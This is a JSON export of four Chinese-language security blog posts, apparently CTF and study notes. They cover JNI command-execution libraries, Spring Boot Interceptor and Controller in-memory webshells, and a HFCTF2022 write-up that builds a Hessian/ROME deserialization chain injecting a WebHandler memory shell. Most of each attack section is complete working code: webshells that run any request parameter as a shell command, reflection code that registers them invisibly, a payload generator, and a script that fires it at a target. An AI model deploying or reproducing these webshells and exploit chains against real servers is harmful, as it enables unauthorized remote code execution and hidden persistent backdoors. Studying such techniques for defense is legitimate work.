[{"title":"JNI","url":"/2025/05/03/JNI/","content":"利用手法目前知道的有两种，一种是.c直接编译成.dll；第二种是得到.h后编写对应.c，然后编译成.jnilib\n.c直接编译#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;//加载进内存前执行__attribute__ ((__constructor__)) void preload (void)&#123;    system(&quot;calc&quot;);&#125;\n\ngcc -shared -fPIC qwq.c -o hack.dll\npublic class Native &#123;    public native String exec(String cmd);&#125;\n\npublic class dll_Loader &#123;    public static void main(String[] args) &#123;        //加载根源的.dll，即.c文件直接编译的        System.load(&quot;your_path/poc.dll&quot;);        Native aNative = new Native();        aNative.exec(&quot;calc&quot;);    &#125;&#125;\n\n.jnilib这里写.jnilib只是为了便于区分，实际上.jinlib一般用与Mac，.dll用于windows，.so用于linux。根据情况选择\n先写Native.java\njavac Native.java 得到.class\njavah -jni Native 得到.h，注意，jdk10以后没有javah命令，需要换一下；Native的位置写完整包名\n然后编写包含.h的.c文件：\n#include &lt;jni.h&gt; // JNI 头文件#include &lt;stdlib.h&gt; // 提供 popen 和 pclose 函数#include &lt;stdio.h&gt; // 提供 fgets 和 FILE 操作#include &lt;string.h&gt; // 提供字符串操作函数#include &quot;Native.h&quot; // 假设这是 JNI 的头文件//命名规则：Java_类的全限定名_方法名JNIEXPORT jstring JNICALL Java_Native_exec(JNIEnv *env, jclass clazz, jstring str) &#123;    if (str != NULL) &#123;        jboolean isCopy;        // 将 jstring 参数转成 char 指针        const char *cmd = (*env)-&gt;GetStringUTFChars(env, str, &amp;isCopy);        if (cmd != NULL) &#123;            // 使用 popen 函数执行系统命令            FILE *fd = popen(cmd, &quot;r&quot;);            if (fd != NULL) &#123;                // 定义缓冲区和结果字符串                char buf[128];                char result[4096] = &#123;0&#125;; // 用于存储命令执行结果                // 读取 popen 的执行结果                while (fgets(buf, sizeof(buf), fd) != NULL) &#123;                    // 将读取到的内容拼接到结果字符串中                    strcat(result, buf);                &#125;                // 关闭 popen                pclose(fd);                // 返回命令执行结果给 Java                jstring ret = (*env)-&gt;NewStringUTF(env, result);                (*env)-&gt;ReleaseStringUTFChars(env, str, cmd); // 释放字符串资源                return ret;            &#125;            (*env)-&gt;ReleaseStringUTFChars(env, str, cmd); // 如果 popen 失败，也要释放字符串资源        &#125;    &#125;    return NULL; // 如果输入为空或执行失败，返回 NULL&#125;\n\n执行 gcc -I”D:\\sec_software\\jdks\\jdk-1.8.0_341\\include” -I”D:\\sec_software\\jdks\\jdk-1.8.0_341\\include\\win32” -shared -o poc.jnilib Native.c\n得到.jnilib\npublic class Native_Caller &#123;    public static void main(String[] args) &#123;        Native aNative = new Native();        System.load(&quot;your_path\\\\poc.jnilib&quot;);        aNative.exec(&quot;calc&quot;);    &#125;&#125;\n\n三种.jnilib加载的方法\n        //加载方法1//        File file = new File(&quot;D:\\\\BaiduSyncdisk\\\\ctf-challenges\\\\1diot9\\\\java-challenges\\\\SUCTF\\\\suctf2025\\\\ez_solon\\\\src\\\\main\\\\java\\\\poc.jnilib&quot;);//        Method method = ClassLoader.class.getDeclaredMethod(&quot;loadLibrary0&quot;, Class.class, File.class);//        method.setAccessible(true);        //这个Native.class一般不会存在于服务器，需要我们通过字节码去加载//        method.invoke(Thread.currentThread().getContextClassLoader(), Native.class, file);        //加载方法2        System.load(&quot;D:\\\\BaiduSyncdisk\\\\ctf-challenges\\\\1diot9\\\\java-challenges\\\\SUCTF\\\\suctf2025\\\\ez_solon\\\\src\\\\main\\\\java\\\\poc.jnilib&quot;);        //加载方法3，失败//        Class&lt;?&gt; aClass = Class.forName(&quot;java.lang.ClassLoader$NativeLibrary&quot;);//        Method method1 = aClass.getDeclaredMethod(&quot;load&quot;, String.class, boolean.class, boolean.class);//        method1.setAccessible(true);//        method1.invoke(null, file.getAbsolutePath(), false, false);\n\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"SpringBoot-Interceptor内存马","url":"/2025/05/04/SpringBoot-Interceptor%E5%86%85%E5%AD%98%E9%A9%AC/","content":"前置知识这里主要讲一下SpringBoot里的各种组件和它们的作用与关系。首先需要知道什么是SpringMVC。MVC就是Model-View-Controller。SpringBoot中内置了SpringMVC，并帮助你把一些繁琐的配置做好了(不需要写web.xml)，使程序员只需要关注业务代码。SpringMVC里有几个重要的部分，分别是DispatcherServlet，HandlerAdapter，Handler。下面简单介绍一下。先看一张图，建立基本认识：\n下面的内容是我问AI的，还挺清楚，大家有什么不懂的也可以直接问AI。\n首先是HandlerAdapter和Handler：在 Spring MVC 中，HandlerAdapter 和 Handler 是两个非常重要的概念，它们在请求处理过程中扮演着不同的角色。为了更好地理解它们的区别和作用，我们先分别解释一下这两个概念，然后再对比它们的不同之处。\nHandler&amp;HandlerAdapter\nHandler（处理器）\n定义：Handler 是一个接口，表示能够处理 HTTP 请求的对象。它通常是控制器（Controller）的一个实例，负责处理特定的 URL 请求。\n功能：Handler 的主要职责是根据传入的请求参数执行相应的业务逻辑，并返回一个 ModelAndView 或其他类型的响应结果。\n实现方式：\n在 Spring MVC 中，最常见的是使用注解驱动的控制器（如 @Controller 或 @RestController），这些控制器类就是 Handler 的具体实现。\n除了注解驱动的方式，Spring MVC 还支持基于接口的控制器（如 Controller 接口），但这种方式已经较少使用。示例：@Controllerpublic class MyController {  @GetMapping(“&#x2F;hello”)public String hello(Model model) {model.addAttribute(“message”, “Hello, World!”);return “hello”;  &#x2F;&#x2F; 返回视图名称}\n\n}\n在这个例子中，MyController 就是一个 Handler，它处理 &#x2F;hello 路径的 GET 请求。\n\nHandlerAdapter（处理器适配器）\n定义：HandlerAdapter 是一个接口，它的作用是将不同类型的 Handler 统一为一种标准的处理方式。它负责调用具体的 Handler 并处理请求。\n功能：HandlerAdapter 的主要职责是将请求交给合适的 Handler 处理，并将处理结果转换为 ModelAndView 或其他响应形式。它充当了框架与具体处理器之间的桥梁。\n实现方式：\nSpring MVC 内置了多种 HandlerAdapter 实现，用于处理不同类型的 Handler。例如：\nRequestMappingHandlerAdapter：用于处理基于注解的控制器（如 @Controller、@RestController）。\nSimpleControllerHandlerAdapter：用于处理实现了 Controller 接口的传统控制器。\nHttpRequestHandlerAdapter：用于处理实现了 HttpRequestHandler 接口的处理器。示例：@RequestMappingHandlerAdapter adapter &#x3D; new RequestMappingHandlerAdapter();adapter.handle(request, response, handler);\n\n在这个例子中，RequestMappingHandlerAdapter 是一个 HandlerAdapter，它负责调用注解驱动的控制器来处理请求。\n\nHandler 和 HandlerAdapter 的区别\n特性Handler（处理器）HandlerAdapter（处理器适配器）角色具体的请求处理者调用并适配不同的 Handler职责执行业务逻辑，处理请求将请求分发给合适的 Handler类型可以是注解驱动的控制器、命令对象等是一个适配器，负责统一处理流程数量可以有多个 Handler通常只有一个或少数几个 HandlerAdapter调用关系Handler 由 HandlerAdapter 调用HandlerAdapter 由 DispatcherServlet 调用\n\n\n工作流程\n在 Spring MVC 中，请求的处理流程如下：1.请求到达：用户发起 HTTP 请求，请求被发送到 DispatcherServlet。2.查找 Handler：DispatcherServlet 使用 HandlerMapping 来查找匹配的 Handler。3.调用 HandlerAdapter：找到合适的 Handler 后，DispatcherServlet 会使用 HandlerAdapter 来调用该 Handler。4.处理请求：HandlerAdapter 调用具体的 Handler，执行业务逻辑。5.返回结果：Handler 处理完请求后，返回一个 ModelAndView 或其他类型的响应结果。6.渲染视图：DispatcherServlet 根据返回的结果选择合适的视图进行渲染，并将响应返回给客户端。\n\n\n总结\nHandler 是实际处理请求的对象，通常是控制器类，负责执行业务逻辑。\nHandlerAdapter 是一个适配器，它负责将请求分发给合适的 Handler，并确保所有类型的 Handler 都能以统一的方式被调用。简单来说，HandlerAdapter 是一个中间层，它使得 Spring MVC 可以灵活地支持多种类型的 Handler，而不需要改变核心的请求处理流程。\nDispatcherServlet然后是DispatcherServlet：DispatcherServlet 是 Spring MVC 框架中的核心组件，它是整个 Web 请求处理流程的前端控制器（Front Controller）。所有的 HTTP 请求都会通过 DispatcherServlet 进行分发和处理。它负责协调 Spring MVC 的各个组件，完成从请求到响应的整个生命周期管理。\n\n\nDispatcherServlet 的作用DispatcherServlet 的作用\n统一入口：DispatcherServlet 是 Spring MVC 的前端控制器，所有的 HTTP 请求都会被转发到这里。\n请求分发：根据请求的 URL 和配置，DispatcherServlet 负责将请求分发给合适的处理器（Handler）。\n组件协作：DispatcherServlet 协调了 Spring MVC 中的多个组件（如 HandlerMapping、HandlerAdapter、ViewResolver 等），确保请求能够被正确处理并返回响应。\n\n\nDispatcherServlet 的工作流程\n当一个 HTTP 请求到达时，DispatcherServlet 的主要工作流程如下：1.接收请求：\n用户发起 HTTP 请求，请求被发送到 DispatcherServlet。2.查找 Handler：\nDispatcherServlet 使用 HandlerMapping 来查找能够处理该请求的 Handler（处理器）。\nHandlerMapping 根据请求的 URL、HTTP 方法等信息，匹配到对应的 Handler。3.调用 HandlerAdapter：\n找到合适的 Handler 后，DispatcherServlet 使用 HandlerAdapter 来调用该 Handler。\nHandlerAdapter 是一个适配器，负责调用不同类型的 Handler 并统一返回结果。4.执行业务逻辑：\nHandler（通常是控制器类）执行具体的业务逻辑，并返回一个 ModelAndView 对象，其中包含模型数据和视图名称。5.解析视图：\nDispatcherServlet 使用 ViewResolver 将视图名称解析为具体的视图对象（如 JSP、Thymeleaf 等）。6.渲染视图：\n视图对象根据模型数据进行渲染，生成最终的 HTML 页面或其他形式的响应内容。7.返回响应：\n渲染完成后，DispatcherServlet 将响应内容返回给客户端。\n\n\nDispatcherServlet 的初始化\n在应用程序启动时，DispatcherServlet 会被初始化。它的初始化过程包括以下几个步骤：1.加载 WebApplicationContext：\nDispatcherServlet 会创建并加载一个独立的 Web 应用上下文（WebApplicationContext），用于存储与 Web 相关的 Bean。2.注册组件：\n初始化过程中，DispatcherServlet 会注册一系列关键组件，例如：\nHandlerMapping：用于匹配请求和处理器。\nHandlerAdapter：用于调用处理器。\nViewResolver：用于解析视图名称。\n其他组件（如异常处理器、拦截器等）。3.准备就绪：\n初始化完成后，DispatcherServlet 准备好接收和处理 HTTP 请求。\n\n\nDispatcherServlet 的配置在传统的 Spring MVC 项目中，DispatcherServlet 通常通过 web.xml 配置文件进行声明。例如：\n&lt;servlet&gt;    &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt;    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt;    &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt;    &lt;url-pattern&gt;/&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;\n\n在 Spring Boot 中，DispatcherServlet 的配置被自动简化，开发者不需要手动编写 web.xml 文件。Spring Boot 会自动配置 DispatcherServlet 并将其映射到 &#x2F; 路径。\nDispatcherServlet 的重要性\n单一入口：DispatcherServlet 是整个 Spring MVC 请求处理流程的起点，所有的请求都必须经过它。\n解耦设计：通过 DispatcherServlet，Spring MVC 实现了请求处理的解耦设计，使得框架可以灵活扩展。\n可扩展性：开发者可以通过自定义 HandlerMapping、HandlerAdapter 或 ViewResolver 等组件，来实现特定的需求。\n\n总结DispatcherServlet 是 Spring MVC 的核心组件，作为前端控制器，它负责接收请求、分发请求、协调组件以及返回响应。它的存在使得 Spring MVC 的请求处理流程清晰且高效，同时提供了高度的灵活性和可扩展性。\n流程分析这里我们做分析的目的，主要是为了知道哪里添加了Interceptor，调用了Interceptor的preHandle方法。\n如上图，直接在DispatcherServlet#doDispatch断点。箭头所指处， 就是开头那张图片的第一步，请求查询Handler，我们跟进。\n继续跟进上图中的getHandler。\n来到了AbstractHandlerMapping，我们继续跟进getHandlerExecutionChain。\n这里就是add Interceptor的地方了。这下我们的目标其实也明确了。通过反射拿到AbstractHandlerMapping的adaptedInterceptor属性，向这个属性里添加我们的interceptor。那么怎么拿到当前代码环境下的，也就是当前上下文里的AbstractHandlerMapping呢？通过获取WebApplicationContext可以做到。\n如上图，回到doDispatch，这里的mappedHandler就是一开始图片里的HandlerExectionChain。这里面包括两个interceptors和处理这个http请求需要用到的controller方法。\n如上图，第一个箭头拿HandlerAdapter，第二个调用Interceptor中的preHandle方法，第三个就是调用controller中的对应方法。这里不讲了，可以自己跟进看一下。\n下面这段可以作为反序列化sink的字节码动态加载。\npackage interceptor;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;//作为反序列化sink动态加载的字节码public class BadInterceptor extends HandlerInterceptorAdapter &#123;    public BadInterceptor() &#123;        try &#123;            //获得context            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);            //获取 adaptedInterceptors 属性值            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(&quot;requestMappingHandlerMapping&quot;);            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);            field.setAccessible(true);            java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);            BadInterceptor aaa = new BadInterceptor(&quot;aaa&quot;);            adaptedInterceptors.add(aaa);        &#125;catch (Exception e)&#123;&#125;    &#125;    public BadInterceptor(String aaaa)&#123;&#125;    @Override    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;        String code = request.getParameter(&quot;bad&quot;);        if(code != null)&#123;            try &#123;                java.io.PrintWriter writer = response.getWriter();                String o = &quot;&quot;;                ProcessBuilder p;                if(System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;))&#123;                    p = new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, code&#125;);                &#125;else&#123;                    p = new ProcessBuilder(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, code&#125;);                &#125;                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\\\A&quot;);                o = c.hasNext() ? c.next(): o;                c.close();                writer.write(o);                writer.flush();                writer.close();            &#125;catch (Exception e)&#123;            &#125;            return false;        &#125;        return true;    &#125;&#125;\n\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"SpringBoot-Controller内存马","url":"/2025/05/05/SpringBoot-Controller%E5%86%85%E5%AD%98%E9%A9%AC/","content":"前置知识这里需要了解Spring IoC，Bean，ApplicationContext是什么。\n基本名词概念Spring IoC（Inversion of Control，控制反转）容器是Spring框架的核心组件之一，它负责管理应用程序中对象的创建、配置和生命周期。通过IoC容器，Spring实现了依赖注入（Dependency Injection, DI），从而降低了组件之间的耦合度，提高了代码的可维护性和可测试性。\nSpring IoC 容器主要功能\n对象的实例化：IoC容器会根据配置文件（如XML、Java注解或Java配置类）来创建对象实例。\n对象的配置：容器不仅负责创建对象，还会根据配置为对象设置属性值或注入依赖。\n对象的装配：容器会根据配置将不同的对象装配在一起，形成完整的应用上下文。\n对象的生命周期管理：容器可以管理对象的生命周期，包括初始化、运行时管理和销毁。\n\nSpring IoC 容器的实现方式Spring提供了两种主要的IoC容器实现：\n\nBeanFactory：这是Spring IoC容器的基础接口，提供基本的依赖注入功能。它是轻量级的，适合资源受限的环境。\nApplicationContext：这是BeanFactory的扩展，提供了更多的企业级功能，例如事件传播、国际化支持、AOP支持等。ApplicationContext是更常用的IoC容器实现。\n\n配置方式Spring IoC容器可以通过以下几种方式进行配置：\n\n基于XML的配置：使用XML文件定义Bean及其依赖关系。\n基于注解的配置：使用如@Component、@Service、@Autowired等注解来声明Bean和依赖注入。\n基于Java配置：使用@Configuration和@Bean注解以编程方式定义Bean。\n\n示例以下是一个简单的基于注解的Spring IoC容器示例：\n// 定义一个服务类，并使用 @Service 注解将其注册为 Bean@Servicepublic class MyService &#123;    public void execute() &#123;        System.out.println(&quot;MyService is executing...&quot;);    &#125;&#125;// 主程序类public class MainApp &#123;    public static void main(String[] args) &#123;        // 创建 Spring 应用上下文        ApplicationContext context = new AnnotationConfigApplicationContext(MainApp.class);        // 从容器中获取 MyService Bean        MyService myService = context.getBean(MyService.class);        myService.execute();    &#125;&#125;\n\n在这个例子中，MyService被注册为一个Bean，并通过IoC容器进行管理。主程序通过context.getBean()方法从容器中获取MyService实例。\n看完之后，我的理解是：\n1、Bean是Spring框架中的对象，而IoC是Bean的管理者\n2、IoC主要有两种实现方式，最基础的是BeanFactory，而它的一个重要子类是ApplicationContext\n3、如果我们能够获取IoC，比如ApplicationContext，那么我们就可以得到任何Bean，也就是得到某次请求中的Context中的任意对象\n这里简单解释一下Context。Context是上下文的意思，而上下文可以简单理解成一个进程运行时，各个类里面的变量等一切和这个进程有关的东西。\n分析之前是分析过Interceptor内存马的，所以我这里直接给EXP。这个EXP适用于springboot&lt;2.6.0\nWebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 beanRequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);// 2. 通过反射获得自定义 controller 中唯一的 Method 对象Method declaredMethod = Class.forName(&quot;bad_controller.BadController&quot;).getDeclaredMethods()[0];// 3. 定义访问 controller 的 URL 地址PatternsRequestCondition url = new PatternsRequestCondition(&quot;/shellCon&quot;);// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();// 5. 在内存中动态注册 controllerRequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);r.registerMapping(info, Class.forName(&quot;bad_controller.BadController&quot;).newInstance(), declaredMethod);return &quot;/shellCon has been added&quot;;\n\n这里获取上下文的方法还是一样。主要看看怎么动态注册Controller。\n还记得Interceptor里的那张图吗？DispatcherServlet先去跟HandlerMapping拿到对应的Controller里的方法和Interceptor，再进行后续处理。所以Controller里的方法是在HandlerMapping里被取出的，所以我们需要重点关注HandlerMapping。\n概括一下，先拿到HandlerMapping，再拿到Controller，再拿到Controller里具体的方法，再拿到路由和请求方式，最后注册即可。\nSpringBoot&gt;&#x3D;2.6.0的EXP：\nWebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;);configField.setAccessible(true);RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);Method method2 = InjectToController2.class.getMethod(&quot;test&quot;);RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();RequestMappingInfo info = RequestMappingInfo.paths(&quot;/shell&quot;).options(config).build();InjectToController2 springControllerMemShell = new InjectToController2(&quot;aaa&quot;);mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);\n\n内存马：\npackage bad_controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;@Controllerpublic class BadController &#123;    public void badCon(HttpServletRequest request, HttpServletResponse response) &#123;        String code = request.getParameter(&quot;cmd&quot;);        if(code != null)&#123;            try &#123;                java.io.PrintWriter writer = response.getWriter();                String o = &quot;&quot;;                ProcessBuilder p;                if(System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;))&#123;                    p = new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, code&#125;);                &#125;else&#123;                    p = new ProcessBuilder(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, code&#125;);                &#125;                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\\\A&quot;);                o = c.hasNext() ? c.next(): o;                c.close();                writer.write(o);                writer.flush();                writer.close();            &#125;catch (Exception e)&#123;            &#125;        &#125;    &#125;&#125;\n\n总结这里我只写了一种注册Controller的方法，获取context的过程也没细讲，可以去看参考文章里的。\n参考基于内存 Webshell 的无文件攻击技术研究-安全KER - 安全资讯平台\nSpring内存马学习\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"WebHandler内存马","url":"/2025/05/05/WebHandler%E5%86%85%E5%AD%98%E9%A9%AC/","content":"主要结合HFCTF2022-ezchain讲\n前言这里的hessian链比较容易，用原生jdk就可以打。不过这里不出网，所以要注入内存马，也就是需要加载字节码。这样原生jdk链虽然可以，但是比较繁琐。这里给了ROME链，就结合ROME链打一个二次反序列化。内存马是WebHandler，不太常见，学习一下。\n解题这里偷懒，照搬别人的了。\n首先是一个简单的hash碰撞，跟进去找到hashcode的计算方法：\n逻辑很简单，乘31后加就是。看最后两位，只要满足31a+b&#x3D;31c+d就行了，其中a&#x3D;50，b&#x3D;50，手算一个就行。这里找到其中一个，HFCTF201Q。\n接下来就是hessian反序列化。这里复现的时候一开始依赖没下完整，以为是打原生jdk，后来才看到有rome链。这里rome链直接放别人的了。\n二次反序列化Rome链SignedObject二次反序列化已经比较熟悉了。\n这里主要看看WebHandler内存马怎么写。\n正常基于tomcat和spring的内存马都是通过上下文来获取request对象，本题目直接使用http handler搭建服务，我们该如何实现动态注册呢？\n按照经验来讲Web中间件是多线程的应用，一般requst对象都会存储在线程对象中，可以通过Thread.currentThread()或Thread.getThreads()获取。\nThread.currentThread()–&gt;group–&gt;threads[1]–&gt;target–&gt;this$0–&gt;contexts–&gt;list[0]–&gt;handler\n内存马：\nimport com.sun.net.httpserver.HttpExchange;import com.sun.net.httpserver.HttpHandler;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.lang.reflect.Field;import java.lang.reflect.Method;public class memoryshell extends AbstractTranslet implements HttpHandler &#123;    static &#123;        //获取当前线程        Object o = Thread.currentThread();        try &#123;            Field groupField = o.getClass().getDeclaredField(&quot;group&quot;);            groupField.setAccessible(true);            Object group = groupField.get(o);            Field threadsField = group.getClass().getDeclaredField(&quot;threads&quot;);            threadsField.setAccessible(true);            Object t = threadsField.get(group);            Thread[] threads = (Thread[]) t;            for (Thread thread : threads)&#123;                if(thread.getName().equals(&quot;Thread-2&quot;))&#123;                    Field targetField = thread.getClass().getDeclaredField(&quot;target&quot;);                    targetField.setAccessible(true);                    Object target = targetField.get(thread);                    Field thisField = target.getClass().getDeclaredField(&quot;this$0&quot;);                    thisField.setAccessible(true);                    Object this$0 = thisField.get(target);                    Method createContext = Class.forName(&quot;sun.net.httpserver.ServerImpl&quot;).getDeclaredMethod(&quot;createContext&quot;, String.class, HttpHandler.class);                    createContext.setAccessible(true);                    createContext.invoke(this$0,&quot;/shell&quot;,new memoryshell());                                    &#125;            &#125;        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;    public void handle(HttpExchange t) throws IOException &#123;        String response = &quot;MemoryShell&quot;;        String query = t.getRequestURI().getQuery();        String[] var3 = query.split(&quot;=&quot;);        ByteArrayOutputStream output = null;        if (var3[0].equals(&quot;cmd&quot;))&#123;            InputStream inputStream = Runtime.getRuntime().exec(var3[1]).getInputStream();            output = new ByteArrayOutputStream();            byte[] buffer = new byte[4096];            int n = 0;            while (-1 != (n = inputStream.read(buffer))) &#123;                output.write(buffer, 0, n);            &#125;        &#125;        response+=(&quot;\\n&quot;+new String(output.toByteArray()));        t.sendResponseHeaders(200, (long)response.length());        OutputStream os = t.getResponseBody();        os.write(response.getBytes());        os.close();    &#125;    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;&#125;\n\nEXP:\npackage com.ctf.ezchain;import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import com.rometools.rome.feed.impl.EqualsBean;import com.rometools.rome.feed.impl.ObjectBean;import com.rometools.rome.feed.impl.ToStringBean;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.security.*;import java.util.Base64;import java.util.HashMap;import javax.xml.transform.Templates;public class memEXP &#123;    //为类的属性设置值    public static void setValue(Object target, String name, Object value) throws Exception &#123;        Field field = target.getClass().getDeclaredField(name);        field.setAccessible(true);        field.set(target,value);    &#125;    public static HashMap getObject() throws Exception &#123;        TemplatesImpl templates = new TemplatesImpl();        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;D:\\\\tmp\\\\memshell\\\\memoryshell.class&quot;));        setValue(templates,&quot;_name&quot;, &quot;aaa&quot;);        setValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;bytecodes&#125;);        setValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());        //构造ToStringBean        ToStringBean toStringBean=new ToStringBean(Templates.class,templates);        ToStringBean toStringBean1=new ToStringBean(String.class,&quot;s&quot;);        //构造ObjectBean        ObjectBean objectBean=new ObjectBean(ToStringBean.class,toStringBean1);        //构造HashMap        HashMap hashMap=new HashMap();        hashMap.put(objectBean,&quot;snakin&quot;);        //反射修改字段        Field obj=EqualsBean.class.getDeclaredField(&quot;obj&quot;);        Field equalsBean=ObjectBean.class.getDeclaredField(&quot;equalsBean&quot;);        obj.setAccessible(true);        equalsBean.setAccessible(true);        obj.set(equalsBean.get(objectBean),toStringBean);        return  hashMap;    &#125;    public static void main(String[] args) throws Exception &#123;        HashMap evilhashMap=getObject();        KeyPairGenerator keyPairGenerator;        keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);        keyPairGenerator.initialize(1024);        KeyPair keyPair = keyPairGenerator.genKeyPair();        PrivateKey privateKey = keyPair.getPrivate();        Signature signingEngine = Signature.getInstance(&quot;DSA&quot;);        SignedObject signedObject = new SignedObject(evilhashMap,privateKey,signingEngine);        ToStringBean toStringBean=new ToStringBean(SignedObject.class,signedObject);        ToStringBean toStringBean1=new ToStringBean(String.class,&quot;s&quot;);        ObjectBean objectBean=new ObjectBean(ToStringBean.class,toStringBean1);        HashMap hashMap=new HashMap();        hashMap.put(objectBean,&quot;snakin&quot;);        Field obj= EqualsBean.class.getDeclaredField(&quot;obj&quot;);        Field equalsBean=ObjectBean.class.getDeclaredField(&quot;equalsBean&quot;);        obj.setAccessible(true);        equalsBean.setAccessible(true);        obj.set(equalsBean.get(objectBean),toStringBean);        Hessian2Output hessianOutput1 = new Hessian2Output(new FileOutputStream(&quot;D:\\\\tmp\\\\payload.bin&quot;));        hessianOutput1.writeObject(hashMap);        hessianOutput1.close();    &#125;&#125;\n\npython:\nimport requests url = &quot;http://fc468662-a072-4ff6-af4c-aa53ea6a8273.node4.buuoj.cn:81/?token=GeCTF2022&quot; with open(&quot;hession.ser&quot;, &quot;rb&quot;) as f:    content = f.read() requests.post(url=url, data=content) url = &quot;http://fc468662-a072-4ff6-af4c-aa53ea6a8273.node4.buuoj.cn:81/shell?cmd=cat /flag&quot;text = requests.get(url).textprint(text)\n\nUnixPrintService链这个这里先不讲了，之后单独开一篇文章\n参考CTF | 2022HFCTF ezchain\n2022虎符CTF-Java部分\n","categories":["Java安全"],"tags":["Java安全"]}]